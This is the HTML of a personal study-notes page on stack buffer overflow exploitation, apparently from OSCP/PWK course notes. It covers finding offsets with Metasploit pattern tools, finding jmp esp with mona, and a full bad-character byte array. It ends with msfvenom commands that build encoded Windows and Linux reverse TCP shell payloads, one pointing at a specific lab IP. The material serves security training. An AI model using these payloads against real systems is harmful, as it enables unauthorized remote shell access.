<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Buffer overflows | Omar2535</title>
    <meta name="generator" content="VuePress 1.9.10">
    
    <meta name="description" content="Notes">
    
    <link rel="preload" href="/assets/css/0.styles.d9d6ac5f.css" as="style"><link rel="preload" href="/assets/js/app.5c7e2713.js" as="script"><link rel="preload" href="/assets/js/2.9a4c6a37.js" as="script"><link rel="preload" href="/assets/js/1.25194066.js" as="script"><link rel="preload" href="/assets/js/55.57a325d0.js" as="script"><link rel="prefetch" href="/assets/js/10.a170acdf.js"><link rel="prefetch" href="/assets/js/100.24f5678a.js"><link rel="prefetch" href="/assets/js/101.36394ea1.js"><link rel="prefetch" href="/assets/js/102.381dff3f.js"><link rel="prefetch" href="/assets/js/103.8ee1078b.js"><link rel="prefetch" href="/assets/js/104.fd7a195d.js"><link rel="prefetch" href="/assets/js/105.77c1262a.js"><link rel="prefetch" href="/assets/js/11.c0feb069.js"><link rel="prefetch" href="/assets/js/12.fb0e6d64.js"><link rel="prefetch" href="/assets/js/13.3dcb41cd.js"><link rel="prefetch" href="/assets/js/14.efc2c885.js"><link rel="prefetch" href="/assets/js/15.8a5e60c8.js"><link rel="prefetch" href="/assets/js/16.f4edd56b.js"><link rel="prefetch" href="/assets/js/17.f86cca87.js"><link rel="prefetch" href="/assets/js/18.da042ca7.js"><link rel="prefetch" href="/assets/js/19.16dbd463.js"><link rel="prefetch" href="/assets/js/20.89143cc3.js"><link rel="prefetch" href="/assets/js/21.2370e981.js"><link rel="prefetch" href="/assets/js/22.4821847d.js"><link rel="prefetch" href="/assets/js/23.b9530bc3.js"><link rel="prefetch" href="/assets/js/24.63874f6c.js"><link rel="prefetch" href="/assets/js/25.6396c6e1.js"><link rel="prefetch" href="/assets/js/26.5ca76fe1.js"><link rel="prefetch" href="/assets/js/27.fceb214e.js"><link rel="prefetch" href="/assets/js/28.aed317fa.js"><link rel="prefetch" href="/assets/js/29.064b8783.js"><link rel="prefetch" href="/assets/js/3.5cf116a2.js"><link rel="prefetch" href="/assets/js/30.2c07e34d.js"><link rel="prefetch" href="/assets/js/31.6badab32.js"><link rel="prefetch" href="/assets/js/32.a833aed2.js"><link rel="prefetch" href="/assets/js/33.09a8bd6e.js"><link rel="prefetch" href="/assets/js/34.71fc7d47.js"><link rel="prefetch" href="/assets/js/35.6b6a7693.js"><link rel="prefetch" href="/assets/js/36.b1b3864f.js"><link rel="prefetch" href="/assets/js/37.66538f93.js"><link rel="prefetch" href="/assets/js/38.c79a72cc.js"><link rel="prefetch" href="/assets/js/39.34d9323e.js"><link rel="prefetch" href="/assets/js/4.5cf04776.js"><link rel="prefetch" href="/assets/js/40.51025031.js"><link rel="prefetch" href="/assets/js/41.e7d0d9ca.js"><link rel="prefetch" href="/assets/js/42.f33028d2.js"><link rel="prefetch" href="/assets/js/43.3c1af4f5.js"><link rel="prefetch" href="/assets/js/44.fec6fa77.js"><link rel="prefetch" href="/assets/js/45.e3f2e591.js"><link rel="prefetch" href="/assets/js/46.61ee225e.js"><link rel="prefetch" href="/assets/js/47.a46b9e2d.js"><link rel="prefetch" href="/assets/js/48.2d660e33.js"><link rel="prefetch" href="/assets/js/49.6dfac500.js"><link rel="prefetch" href="/assets/js/5.83d8d9cc.js"><link rel="prefetch" href="/assets/js/50.46cab3c1.js"><link rel="prefetch" href="/assets/js/51.54f0c1d5.js"><link rel="prefetch" href="/assets/js/52.444754f4.js"><link rel="prefetch" href="/assets/js/53.000c5671.js"><link rel="prefetch" href="/assets/js/54.63a99a62.js"><link rel="prefetch" href="/assets/js/56.4a4fa2e2.js"><link rel="prefetch" href="/assets/js/57.21ba8032.js"><link rel="prefetch" href="/assets/js/58.835150ce.js"><link rel="prefetch" href="/assets/js/59.b75ba6bd.js"><link rel="prefetch" href="/assets/js/6.2aebede8.js"><link rel="prefetch" href="/assets/js/60.fce32a87.js"><link rel="prefetch" href="/assets/js/61.43bda37e.js"><link rel="prefetch" href="/assets/js/62.4223514c.js"><link rel="prefetch" href="/assets/js/63.532acbef.js"><link rel="prefetch" href="/assets/js/64.04d178ad.js"><link rel="prefetch" href="/assets/js/65.8871c65a.js"><link rel="prefetch" href="/assets/js/66.13ba9899.js"><link rel="prefetch" href="/assets/js/67.a7d33675.js"><link rel="prefetch" href="/assets/js/68.db280e75.js"><link rel="prefetch" href="/assets/js/69.107ef3e7.js"><link rel="prefetch" href="/assets/js/7.e556b776.js"><link rel="prefetch" href="/assets/js/70.ae88b738.js"><link rel="prefetch" href="/assets/js/71.a8650e94.js"><link rel="prefetch" href="/assets/js/72.e62d7e5c.js"><link rel="prefetch" href="/assets/js/73.6215bf4a.js"><link rel="prefetch" href="/assets/js/74.e288deda.js"><link rel="prefetch" href="/assets/js/75.ec8117cf.js"><link rel="prefetch" href="/assets/js/76.395483d0.js"><link rel="prefetch" href="/assets/js/77.117ff4c1.js"><link rel="prefetch" href="/assets/js/78.45cf0a72.js"><link rel="prefetch" href="/assets/js/79.c9c33f3b.js"><link rel="prefetch" href="/assets/js/80.9b884e54.js"><link rel="prefetch" href="/assets/js/81.bca310d4.js"><link rel="prefetch" href="/assets/js/82.3b1564a7.js"><link rel="prefetch" href="/assets/js/83.96aea01e.js"><link rel="prefetch" href="/assets/js/84.f31d2af5.js"><link rel="prefetch" href="/assets/js/85.2e972253.js"><link rel="prefetch" href="/assets/js/86.fd9cbe59.js"><link rel="prefetch" href="/assets/js/87.5e8a353d.js"><link rel="prefetch" href="/assets/js/88.1fdd1aac.js"><link rel="prefetch" href="/assets/js/89.51400c15.js"><link rel="prefetch" href="/assets/js/90.254adeba.js"><link rel="prefetch" href="/assets/js/91.02b2b148.js"><link rel="prefetch" href="/assets/js/92.af67168d.js"><link rel="prefetch" href="/assets/js/93.0b3caf8a.js"><link rel="prefetch" href="/assets/js/94.6fc6b60b.js"><link rel="prefetch" href="/assets/js/95.d59f8c6b.js"><link rel="prefetch" href="/assets/js/96.d94d45cd.js"><link rel="prefetch" href="/assets/js/97.ebee2487.js"><link rel="prefetch" href="/assets/js/98.4c94c079.js"><link rel="prefetch" href="/assets/js/99.c628bd76.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.0115b510.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d9d6ac5f.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Omar2535</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/misc/Accomplishments/" class="sidebar-link">Accomplishments</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Certs/" class="sidebar-heading clickable"><span>Certs</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Courses/" class="sidebar-heading clickable router-link-active open"><span>Courses</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/CPSC310/" class="sidebar-heading clickable"><span>CPSC310</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS203/" class="sidebar-heading clickable"><span>PHYS203</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS216/" class="sidebar-heading clickable"><span>PHYS216</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS304/" class="sidebar-heading clickable"><span>PHYS304</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PWK/" class="sidebar-heading clickable router-link-active open"><span>PWK</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/misc/Courses/PWK/buffer_overflow.html" aria-current="page" class="active sidebar-link">Buffer overflows</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#create-pattern" class="sidebar-link">Create pattern</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#pattern-offset-finder" class="sidebar-link">Pattern offset finder</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#generate-assembly-instruction-opcodes" class="sidebar-link">Generate assembly instruction opcodes</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#mona-finding-jmp-esp" class="sidebar-link">Mona finding jmp esp</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#bad-characters" class="sidebar-link">Bad characters</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/buffer_overflow.html#shell-payloads" class="sidebar-link">Shell payloads</a></li></ul></li><li><a href="/misc/Courses/PWK/course_notes.html" class="sidebar-link">OSCP Notes</a></li><li><a href="/misc/Courses/PWK/linux_privesc.html" class="sidebar-link">Linux privilege escalation</a></li><li><a href="/misc/Courses/PWK/shells.html" class="sidebar-link">Shells</a></li><li><a href="/misc/Courses/PWK/sql_injection.html" class="sidebar-link">SQL injection</a></li><li><a href="/misc/Courses/PWK/windows_privesc.html" class="sidebar-link">Windows privilege escalation</a></li><li><a href="/misc/Courses/PWK/wordpress.html" class="sidebar-link">Wordpress</a></li></ul></section></li><li><a href="/misc/Courses/practical-ethical-hacking.html" class="sidebar-link">Practical ethical hacking</a></li></ul></section></li><li><a href="/misc/Guides/" class="sidebar-link">Guides</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Hackthebox/" class="sidebar-heading clickable"><span>Hackthebox</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Root-me/" class="sidebar-heading clickable"><span>Root-me</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Tryhackme/" class="sidebar-heading clickable"><span>Tryhackme</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Writeups/" class="sidebar-heading clickable"><span>Writeups</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="buffer-overflows"><a href="#buffer-overflows" class="header-anchor">#</a> Buffer overflows</h1> <ol><li>Search for buffer overflow vunlerability by determining at what length does the program crash</li> <li>Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which <code>eip</code> is overwritten</li> <li>Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through</li> <li>Find which register points to somewhere in the stack where we can write to</li> <li>Find an instruction that jumps to the register ie. <code>jmp esp</code></li> <li>Get that instructions address and overwrite <code>eip</code> with that</li> <li>Use the register's location and put our shell code there</li></ol> <h2 id="create-pattern"><a href="#create-pattern" class="header-anchor">#</a> Create pattern</h2> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-pattern_create <span class="token parameter variable">-l</span> <span class="token operator">&lt;</span>length<span class="token operator">&gt;</span>
</code></pre></div><h2 id="pattern-offset-finder"><a href="#pattern-offset-finder" class="header-anchor">#</a> Pattern offset finder</h2> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-pattern_offset <span class="token parameter variable">-q</span> <span class="token operator">&lt;</span>pattern_found<span class="token operator">&gt;</span>
</code></pre></div><h2 id="generate-assembly-instruction-opcodes"><a href="#generate-assembly-instruction-opcodes" class="header-anchor">#</a> Generate assembly instruction opcodes</h2> <div class="language-sh extra-class"><pre class="language-sh"><code>msf-nasm_shell
nasm <span class="token operator">&gt;</span> <span class="token function">add</span> eax,12
00000000  83C00C            <span class="token function">add</span> eax,byte +0xc
</code></pre></div><h2 id="mona-finding-jmp-esp"><a href="#mona-finding-jmp-esp" class="header-anchor">#</a> Mona finding jmp esp</h2> <p>First find one where everything is false like <code>ASLR</code> and such:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona modules
</code></pre></div><p>once the <code>.dll</code> or <code>.exe</code> is found, we can use mona to find the command:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">'\xff\xe4'</span> <span class="token parameter variable">-m</span> pprogramname.exe
</code></pre></div><div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona jmp <span class="token parameter variable">-r</span> esp
<span class="token comment"># click view &gt; log or press alt + L</span>
</code></pre></div><p>or</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">'\xff\xe4'</span>
</code></pre></div><p><strong>Remember to send the address in little endian</strong></p> <h2 id="bad-characters"><a href="#bad-characters" class="header-anchor">#</a> Bad characters</h2> <p><strong>Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.</strong></p> <p>The following is missing <code>\x00,\x1A,\x1D</code></p> <div class="language-python extra-class"><pre class="language-python"><code>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>
    <span class="token string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span>
    <span class="token string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span>
    <span class="token string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span>
    <span class="token string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span>
    <span class="token string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span>
    <span class="token string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span>
    <span class="token string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span>
    <span class="token string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>
<span class="token punctuation">)</span>
</code></pre></div><h2 id="shell-payloads"><a href="#shell-payloads" class="header-anchor">#</a> Shell payloads</h2> <h3 id="shikata-ga-nai"><a href="#shikata-ga-nai" class="header-anchor">#</a> Shikata ga nai</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_host<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening_port<span class="token operator">&gt;</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>illegal characters as string ie. <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x12">\x12</span>...&quot;</span><span class="token operator">&gt;</span>
</code></pre></div><h3 id="fnstenv-mov"><a href="#fnstenv-mov" class="header-anchor">#</a> Fnstenv mov</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening host<span class="token operator">&gt;</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>listening port<span class="token operator">&gt;</span> <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/fnstenv_mov <span class="token parameter variable">-b</span> <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x45">\x45</span>...&quot;</span>
</code></pre></div><h3 id="linux-reverse-tcp-shells"><a href="#linux-reverse-tcp-shells" class="header-anchor">#</a> Linux reverse tcp shells</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> linux/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread <span class="token parameter variable">-f</span> c <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>illegal characters as string ie. <span class="token string">&quot;<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x12">\x12</span>...&quot;</span><span class="token operator">&gt;</span>
</code></pre></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/misc/Courses/PHYS304/important_equations.html" class="prev">
        Important Equations
      </a></span> <span class="next"><a href="/misc/Courses/PWK/course_notes.html">
        OSCP Notes
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.5c7e2713.js" defer></script><script src="/assets/js/2.9a4c6a37.js" defer></script><script src="/assets/js/1.25194066.js" defer></script><script src="/assets/js/55.57a325d0.js" defer></script>
  </body>
</html>
